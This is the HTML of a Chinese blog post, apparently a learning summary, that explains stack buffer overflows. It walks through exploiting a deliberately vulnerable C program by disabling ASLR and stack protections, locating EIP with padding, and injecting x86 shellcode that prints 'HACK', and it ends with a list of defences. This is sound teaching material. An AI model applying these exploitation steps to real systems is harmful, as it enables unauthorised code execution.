@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>浅析缓冲区溢出 | 王六六的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="&amp;emsp;最近一直在学习缓冲区溢出漏洞的攻击，但是关于这一块的内容还是需要很多相关知识的基础，例如编程语言及反汇编工具使用。所以研究透彻还需要不少的时间，这里简单的做一个学习的总结，通过具体的实验案例对缓冲区溢出进行简要的解析。&amp;emsp;汇编语言及编程语言是基础，其次是对反编译工具的使用：比如gdb、IDA pro、objdump等。汇编语言的学习可以看王爽编写的《汇编语言》，很适合初学者学习">
+<meta name="keywords" content="缓冲区溢出 c语言">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析缓冲区溢出">
+<meta property="og:url" content="http://wang66.top/2018/08/18/浅析缓冲区溢出/index.html">
+<meta property="og:site_name" content="王六六的博客">
+<meta property="og:description" content="&amp;emsp;最近一直在学习缓冲区溢出漏洞的攻击，但是关于这一块的内容还是需要很多相关知识的基础，例如编程语言及反汇编工具使用。所以研究透彻还需要不少的时间，这里简单的做一个学习的总结，通过具体的实验案例对缓冲区溢出进行简要的解析。&amp;emsp;汇编语言及编程语言是基础，其次是对反编译工具的使用：比如gdb、IDA pro、objdump等。汇编语言的学习可以看王爽编写的《汇编语言》，很适合初学者学习">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://i1.bvimg.com/658463/d451a9a042810168.png">
+<meta property="og:image" content="http://i1.bvimg.com/658463/19edeca98fe7706e.png">
+<meta property="og:image" content="http://i1.bvimg.com/658463/b2c3a86f73b7a30e.png">
+<meta property="og:image" content="http://i1.bvimg.com/658463/28a1dc54762f40e4.png">
+<meta property="og:image" content="http://i1.bvimg.com/658463/8d15a158999959c6.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/960cc24e6304b66a.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/990985d6756d708b.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/c379a0463bbcedef.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/7ae94e4e3616f796.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/a787508f85dbd30d.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/bac21ce82beef1df.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/6f91c08ddd9ebb4f.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/b1b5c4278acbbf2a.png">
+<meta property="og:image" content="http://i2.bvimg.com/658463/65686058894fa689.png">
+<meta property="og:updated_time" content="2018-08-18T10:11:27.989Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浅析缓冲区溢出">
+<meta name="twitter:description" content="&amp;emsp;最近一直在学习缓冲区溢出漏洞的攻击，但是关于这一块的内容还是需要很多相关知识的基础，例如编程语言及反汇编工具使用。所以研究透彻还需要不少的时间，这里简单的做一个学习的总结，通过具体的实验案例对缓冲区溢出进行简要的解析。&amp;emsp;汇编语言及编程语言是基础，其次是对反编译工具的使用：比如gdb、IDA pro、objdump等。汇编语言的学习可以看王爽编写的《汇编语言》，很适合初学者学习">
+<meta name="twitter:image" content="http://i1.bvimg.com/658463/d451a9a042810168.png">
+  
+    <link rel="alternate" href="/atom.xml" title="王六六的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+  <!--顶部加载条-->
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://i1.bvimg.com/658463/5e7d7b6fc3890bcb.jpg">
+    <h2 class="author">王六六</h2>
+    <h3 class="description">It&#39;s raining cats and dogs.</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>6</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="http://www.jilehui.top/" title="靶场">
+            <li>靶场</li>
+          </a>
+        
+          <a href="http://www.jilehui.top/wo.html" title="关于">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-浅析缓冲区溢出" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/18/浅析缓冲区溢出/" class="article-date">
+  <time class="post-time" datetime="2018-08-18T08:49:06.000Z" itemprop="datePublished">
+    <span class="post-month">8月</span><br/>
+    <span class="post-day">18</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浅析缓冲区溢出
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&emsp;最近一直在学习缓冲区溢出漏洞的攻击，但是关于这一块的内容还是需要很多相关知识的基础，例如编程语言及反汇编工具使用。所以研究透彻还需要不少的时间，这里简单的做一个学习的总结，通过具体的实验案例对缓冲区溢出进行简要的解析。<br>&emsp;汇编语言及编程语言是基础，其次是对反编译工具的使用：比如<strong>gdb</strong>、<strong>IDA pro</strong>、<strong>objdump</strong>等。汇编语言的学习可以看王爽编写的《汇编语言》，很适合初学者学习的一本书。(对于初学者来说，必要的知识屏蔽是很重要的，这本书就是按这个思想编写，所以看这本书的感觉就非常流畅。)<br>&emsp;缓冲区溢出是一种常见的攻击手段，原因在于缓冲区漏洞非常普遍，并且易于实现。缓冲区溢出漏洞占了远程网络攻击的绝大多数，成为远程攻击的主要手段。在CTF比赛中这一类的题目也是非常热门(pwn题)。利用缓冲区溢出攻击可以导致程序运行失败、系统崩溃等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。<br><!-- TOC --></p>
+<ul>
+<li><a href="#缓冲区溢出及其原理">缓冲区溢出及其原理</a><ul>
+<li><a href="#编译源程序">编译源程序</a></li>
+<li><a href="#执行程序">执行程序</a></li>
+<li><a href="#原因分析">原因分析</a></li>
+</ul>
+</li>
+<li><a href="#缓冲区溢出攻击例子">缓冲区溢出攻击例子</a><ul>
+<li><a href="#一创建程序">一、创建程序</a></li>
+<li><a href="#二编译程序">二、编译程序</a></li>
+<li><a href="#三覆盖eip">三、覆盖EIP</a></li>
+<li><a href="#四构造shellcode">四、构造shellcode</a></li>
+<li><a href="#五注入shellcode">五、注入shellcode</a></li>
+</ul>
+</li>
+<li><a href="#缓冲区溢出攻击的防范">缓冲区溢出攻击的防范</a></li>
+</ul>
+<!-- /TOC -->
+<a id="more"></a>
+<h1 id="缓冲区溢出及其原理"><a href="#缓冲区溢出及其原理" class="headerlink" title="缓冲区溢出及其原理"></a>缓冲区溢出及其原理</h1><p>关于缓冲区溢出的原理网上也很多，这里用一个我觉得不错的实验示例进行讲解。</p>
+<p><font color="red">(注意：此处编译环境为CentOS  5.0 (32bit)，其他版本的linux可能需要修改8,9行代码)</font><br>先来看以下这个例子：<br>首先用C语言编写一个程序，如下所示，保存为buffer.c文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">8</span>];  <span class="comment">//创建一个大小为8 的缓冲区</span></span><br><span class="line">	<span class="keyword">int</span> *ret;    </span><br><span class="line">	ret=(<span class="keyword">int</span>*)(buffer+<span class="number">16</span>);  </span><br><span class="line">	(*ret)+=<span class="number">7</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">	<span class="keyword">int</span> x;  </span><br><span class="line">	x=<span class="number">99999</span>;  </span><br><span class="line">	function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  </span><br><span class="line">	x=<span class="number">1</span>;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);  </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="编译源程序"><a href="#编译源程序" class="headerlink" title="编译源程序"></a>编译源程序</h2><p>如图1所示，执行#gcc  buffer.c  –o  buffer.o命令，编译源程序。<font color="red">(有些高版本的linux可以加-fno-stack-protector  -z  execstack参数关闭保护措施 )</font><br><img src="http://i1.bvimg.com/658463/d451a9a042810168.png" alt="图1"></p>
+<h2 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h2><p>如图1所示，执行./buffer.o命令，输出结果99999.通过分析主函数的流程，应该输出1，可是输出的为99999。原因在于function()函数。</p>
+<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>下面对buffer.o程序在内存中的分步情况及执行流程进行分析。<br>一个程序在内存中通常分为程序段、数据段和堆栈。<br>(1)<strong>程序段</strong>：存放程序的机器码和只读数据<br>(2)<strong>数据段</strong>：存放程序中的静态数据和全局变量<br>(3)<strong>堆栈</strong>：存放动态数据及局部变量<br>在内存中，它们的位置如图2所示:<br><img src="http://i1.bvimg.com/658463/19edeca98fe7706e.png" alt="图2"><br>堆栈是一块保存数据的连续内存，一个名为堆栈指针(SP)的寄存器标识出了栈顶的位置，堆栈的底部在一个固定的地址。图2简化了一下如图3所示，栈的增长是由低地址位向高地址位，而堆的增长刚好相反。<br><img src="http://i1.bvimg.com/658463/b2c3a86f73b7a30e.png" alt="图3"><br>理论上说，局部变量可以用SP加偏移量来引用。堆栈由逻辑堆栈帧组成，一个函数对应一个堆栈帧。<br><strong><em>当调用函数时</em></strong>，逻辑堆栈帧被压入栈中，堆栈帧包括函数的参数、返回地址、EBP(EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码)和局部变量(如果函数有局部变量)。程序执行结束后，局部变量的内容将会消失，但是不会被清除。<br><strong><em>当函数返回时</em></strong>，逻辑堆栈帧从栈中被弹出，然后弹出EBP，恢复堆栈到调用函数时的地址，最后弹出返回地址到EIP(寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。)，从而继续运行程序。<br>如过想多了解一些关于寄存器的知识，可以阅读这篇文章：(<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/37912755</a>)<br>接下来，我们来看function(1,2,3)函数，调用函数的过程如图4所示：<br><img src="http://i1.bvimg.com/658463/28a1dc54762f40e4.png" alt="图4"><br>&emsp;首先把参数压入栈：在C语言中参数的压栈顺序是反向的，是以从后往前的顺序将function的3个参数3,2,1压入栈中。<br>&emsp;然后保存指令寄存器(ip)中的内容作为返回地址(return2)压入栈中；第3个放入栈的是基址寄存器EBP(sfp)。<br>&emsp;接着把当前的栈指针(sp)复制到EBP，作为新栈帧的基地址(sfp，栈帧指针)。这里准备进入function函数。<br>&emsp;最后把栈指针(sp)减去适当的数值(可以理解为指针由高地址位向低地址位滑动)，将局部变量(buffer和ret)压入栈中执行第9行语句ret=(int<em>)(buffer+16)；后，指针ret指向return2所指的存储单元；<br>&emsp;执行代码中第10行语句(</em>ret)+=7；后，调用函数function()后的返回地址(return2所指的存储单元)指向了第18行，第17行被隔过去了，溢出的数据覆盖了原来的返回地址，因此，该程序的输出结果是99999。<br>这个就是一个简单的栈溢出的情况。</p>
+<h1 id="缓冲区溢出攻击例子"><a href="#缓冲区溢出攻击例子" class="headerlink" title="缓冲区溢出攻击例子"></a>缓冲区溢出攻击例子</h1><p>接下来，我们将要思考一段包含了可利用缓冲区溢出的代码，并据此展示一次攻击。<br>&emsp;在具体地讨论缓冲区溢出攻击之前，可以先考虑一下此类攻击可能会爆发的现实场景。假设网站上web表单请用户输入数据，如姓名、年龄、出生日期等此类的相关信息。被输入的信息随后被传送到一台服务器上，而这台服务器会将“姓名”字段中输入的数据写入可以容纳N个字符的缓冲区中。如果服务器软件没有去验证可以确保输入的姓名的长度至多为N个字符的话，就可能会发生一次缓冲区溢出。如果溢出的数据是一段恶意代码，那么系统也将可能会去执行，从而受到攻击。<br>&emsp;这里我使用的系统是<strong>ubuntu 18.04 (64bit)</strong>。当前硬件已支持数据保护功能，也即栈上注入的指令无法执行，同时现在的操作系统默认启用地址随机化功能，所有很难猜测到EIP注入的地址。这里就先要把实验环境配置好(这一步很重要，如果实验中出现问题，很大可能就是环境配置的关系)：</p>
+<blockquote>
+<ol>
+<li>关闭地址随机化功能(这里可能会遇到权限问题，可以手动修改，把里面的值改为0即可)：</li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol start="2">
+<li>这次测试用到的是编译出32位程序，但现在常见的都是64位系统，可以先安装gcc编译32位程序用到的库：</li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+<h2 id="一、创建程序"><a href="#一、创建程序" class="headerlink" title="一、创建程序"></a>一、创建程序</h2><p>我们先构建一段代码开始，命名为bo.c。(这里为了直接展示缓冲区漏洞攻击方法，就省掉了与网络相关的部分。)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];  </span><br><span class="line">    FILE *fp;  </span><br><span class="line">    fp = fopen(<span class="string">"test.txt"</span>, <span class="string">"r"</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!fp) </span><br><span class="line">	&#123;  </span><br><span class="line">    	perror(<span class="string">"fopen"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    fread(buf, <span class="number">1024</span>, <span class="number">1</span>, fp);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"data: %s\n"</span>, buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">	  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	f();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>简要的分析下这段代码有溢出问题的原因是：这段程序的作用是输出文件中的字符，它声明的buf数组的字符数量为32，但是拷贝了最多可达1024个字符，因此就可以把文件的字符如果超过一定的数量，就会造成溢出，并被程序执行这些溢出的字符。</p>
+<h2 id="二、编译程序"><a href="#二、编译程序" class="headerlink" title="二、编译程序"></a>二、编译程序</h2><p>编译源程序，输入如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -fno-stack-protector -o bo bo.c -m32 -Wl,-zexecstack</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>这里加了几个参数，它们的功能分别是：<br>-fno-stack-protector : 禁用栈溢出检测功能<br>-m32 : 生成32位程序<br>-Wl,-zexecstack : 支持栈端可执行</p>
+<hr>
+<p>看解释就知道为什么加这些参数了。<br>编译完成之后，我们简要的说明下一步该如何利用溢出进行攻击。思路如下：<br>&emsp;使用的也是上一个例子的原理，buf数组溢出后，从文件读取的内容就会在当前栈帧沿着高地址覆盖，而该栈帧的顶部存放着返回上一个函数的地址(EIP)，只要我们覆盖了该地址，就可以修改程序的执行路径，使它运行文件中的代码。这种攻击一般也叫做返回库函数攻击。<br>&emsp;因此，我们需要知道从文件读取多少个字节才能开始覆盖EIP。常见的方法有两种：<br>&emsp;一种方法是反编译程序进行推导，另一种方法就是进行基本的手工测试。第一种方法通常需要更深入的汇编知识，且适用于不知道源码的情况。这里我们已经知道源码，已经发现了问题所在，所以就选择后者进行尝试，确定一下写个多少字节才能覆盖EIP。</p>
+<h2 id="三、覆盖EIP"><a href="#三、覆盖EIP" class="headerlink" title="三、覆盖EIP"></a>三、覆盖EIP</h2><p>根据源码我们创建text.txt文件并写入字符进行尝试，尝试的方法很简单，EIP前的空间使用’A’填充，而EIP使用’BBBB’填充，使用两种不同的字母是为了方便找到边界。<br>&emsp;目前知道buf数组大小为32个字符，可以先尝试填充32个’A’和追加’BBBB’，如果程序没有出现segment fault(段错误)，则每次增加’A’字符4个，不断尝试直到程序运行出现segment fault。(我这里到48个的时候出现segment fault，32位系统大概在40左右)如果 ‘BBBB’刚好对准EIP的位置，那么函数返回时，将EIP内容将给PC指针，因为0x42424242(B的ascii码为0x42)是不可访问地址，所以出现segment fault，此时eip寄存器值就是0x42424242。<br>&emsp;这里可以手工在文件文件中输入字符，但毕竟繁琐，所以可以使用perl脚本写入(之后写入shellcode也要用到)。<br>所经过的尝试如下：<br><strong>第一次：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x32 . &quot;B&quot;x4&apos; &gt; test.txt ;</span><br></pre></td></tr></table></figure>
+<p>写入文件中的内容为：AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB<br>再运行程序./bo<br><img src="http://i1.bvimg.com/658463/8d15a158999959c6.png" alt="第一次结果"><br>结果：已溢出，造成输出乱码，但没有segment fault。<br><strong>第二次增加4个A字符：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x36 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/658463/960cc24e6304b66a.png" alt="第二次结果"><br><strong>之后的步骤省略，跳到出现segment fault的这一步：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/658463/990985d6756d708b.png" alt=""><br>结果：产生了segment fault。</p>
+<hr>
+<p>接下来就使用调试工具gdb，分析并确定此时的EIP是否为0x42424242。<br>1.在使用gdb前，首先输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>
+<p>用这个命令是为了产生core文件，core就是程序运行发行段错误时的文件。<br>2.接着运再行一下上面的出错的那条指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bo</span><br></pre></td></tr></table></figure>
+<p>此时当前目录下会出现一个core文件<br><img src="http://i2.bvimg.com/658463/c379a0463bbcedef.png" alt=""><br>3.之后就是使用gdb分析程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./bo core –q</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/658463/7ae94e4e3616f796.png" alt=""></p>
+<p>分析core文件，发现eip被写成’0x424242’(BBBB)，可以确定注入内容中的’BBBB’对准了栈中存放EIP的位置。 找到EIP位置，我们就离成功迈进了一大步。值得注意的是：现在的系统有保护机制，所以找准eip的难度会大大增加。不过现在也有出现了更多有效的方法，感兴趣的朋友可以更深入地进行学习。</p>
+<hr>
+<h2 id="四、构造shellcode"><a href="#四、构造shellcode" class="headerlink" title="四、构造shellcode"></a>四、构造shellcode</h2><p>通过之前的步骤，我们可以控制EIP之后，下一步操作就是往栈里面注入二进指令，然后修改EIP执行这段代码。那么当函数执行完后，就会执行我们的指令啦。<br> 通常我们将注入的这段指令称为shellcode，解释为这段指令是打开一个shell(bash)，然后攻击者可以在shell执行任意命令，所以称为shellcode。<br> 这里我们不需要写一段复杂的shellcode去打开shell。为了能证明成功控制程序，我们可以使它在终端上输出”HACK”字符串，然后程序退出。 简便起见， 我们构造的shellcode就相当于下面两句C语言的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(1, &quot;HACK\n&quot;, 5);</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></p>
+<p>因为shellcode将会直接操作寄存器和一些系统调用，所以对于shellcode的编写基本上是用高级语言编写一段程序然后编译，反汇编从而得到16进制的操作码，当然也可以直接写汇编然后从二进制文件中提取出16进制的操作码。 下面就是32位x86的汇编代码shell.s：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BITS 32  </span><br><span class="line">start:  </span><br><span class="line">xor eax, eax  </span><br><span class="line">xor ebx, ebx  </span><br><span class="line">xor ecx, ecx  </span><br><span class="line">xor edx, edx  </span><br><span class="line">	  </span><br><span class="line">mov bl, 1  </span><br><span class="line">add esp, string - start  </span><br><span class="line">mov ecx, esp  </span><br><span class="line">mov dl, 5  </span><br><span class="line">mov al, 4  </span><br><span class="line">int 0x80  </span><br><span class="line">  </span><br><span class="line">mov al, 1  </span><br><span class="line">mov bl, 1  </span><br><span class="line">dec bl  </span><br><span class="line">int 0x80  </span><br><span class="line">  </span><br><span class="line">string:  </span><br><span class="line">db &quot;HACK&quot;, 0xa</span><br></pre></td></tr></table></figure></p>
+<p>再编译程序：</p>
+<blockquote>
+<p>nasm -o shell shell.s</p>
+</blockquote>
+<p>之后反编译：</p>
+<blockquote>
+<p>ndisasm shell1</p>
+</blockquote>
+<p>得到如下结果：<br><img src="http://i2.bvimg.com/658463/a787508f85dbd30d.png" alt=""></p>
+<p>&emsp;现在我们找到了EIP的位置，也有了我们要执行的shellcode，但这个EIP应该修改为什么值，才能在函数返回时执行注入的shellcode呢？<br>&emsp;我们可以这样想，从栈的基本模型上看(下图)，当函数返回，弹出EBP(栈基址)，恢复堆栈到调用函数时的地址，再弹出返回地址到EIP，ESP寄存器的值(栈指针)向上移动，指向我们的shellcode。因此，我们使用上面的注入内容生成core时，ESP寄存器的值就是shellcode的开始地址，也就是EIP应该注入的值。<br><img src="http://i2.bvimg.com/658463/bac21ce82beef1df.png" alt=""></p>
+<h2 id="五、注入shellcode"><a href="#五、注入shellcode" class="headerlink" title="五、注入shellcode"></a>五、注入shellcode</h2><p>我们知道要成功执行shellcode就要使EIP的值为shellcode开始的地址。那如何找到shellcode开始的地址呢？我们先尝试着把构造好的shellcode文本给程序执行，使它生成新的core。(这里要先删掉之前的core文件)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4 . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos; &gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/658463/6f91c08ddd9ebb4f.png" alt=""></p>
+<blockquote>
+<p>再执行gdb  ./bo core –q</p>
+</blockquote>
+<p><img src="http://i2.bvimg.com/658463/b1b5c4278acbbf2a.png" alt=""></p>
+<p>上面我们知道，ESP的值就是shellcode开始的地址，ESP现在值为0xffffcf70，所有EIP注入值就是该值，(这一步一定要关闭地址随机化功能)。由于X86是小端的字节序，所以注入字节串需要改为”\x70\xcf\xff\xff”<br>然后将EIP原来的注入值’BBBB’变成”\x70\xcf\xff\xff”，使eip指向的地址为shellcode开始运行的地址即可。再次测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;\x70\xcf\xff\xff&quot; . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos;&gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/658463/65686058894fa689.png" alt=""><br>结果：程序输出HACK字符串了，说明我们成功控制了EIP，并执行了shellcode。<br>如果这段shellcode构造的再复杂一些，我们就能做更多的事。(坏笑~)<br>&emsp;这也是算是最简单的缓冲区溢出漏洞攻击的例子了，所讲的技术也有点过时，对于现在的系统来讲，已经不大可能管用了。但不管怎么样，对于初步的学习还是很助于理解的。一切的学习可以从这个简单的例子出发，一步步的进行更深入下去。然后在其中发现更多的精彩。</p>
+<h1 id="缓冲区溢出攻击的防范"><a href="#缓冲区溢出攻击的防范" class="headerlink" title="缓冲区溢出攻击的防范"></a>缓冲区溢出攻击的防范</h1><p>了解攻击原理是为了能更好的进行防御，最后简要的说明一下如何防范这类攻击的发生。<br>(1)关闭不需要的特权程序。<br>(2)及时给系统和服务程序漏洞打补丁。<br>(3)强制写正确的代码。<br>(4)通过操作系统使得缓冲区不可执行，从而阻止攻击者植入攻击代码。<br>(5)利用编译器的边界检查来实现缓冲区的保护，这个方法使得缓冲区溢出不可能出现，从而完全消除了缓冲区溢出的威胁，但是代价比较大。<br>(6)在程序指针失效前进行完整性检查。<br>(7)改进系统内部安全机制。</p>
+<hr>
+<p><strong><em>参考文章</em></strong>：<a href="https://blog.csdn.net/linyt/article/details/43283331" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/43283331</a><br><strong><em>发表链接</em></strong>：<a href="https://segmentfault.com/a/1190000015993766" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015993766</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wang66.top/2018/08/18/浅析缓冲区溢出/" data-id="cjkz9ktkg0002s0nj5cmn1mkl" class="article-share-link">分享</a>
+      
+      
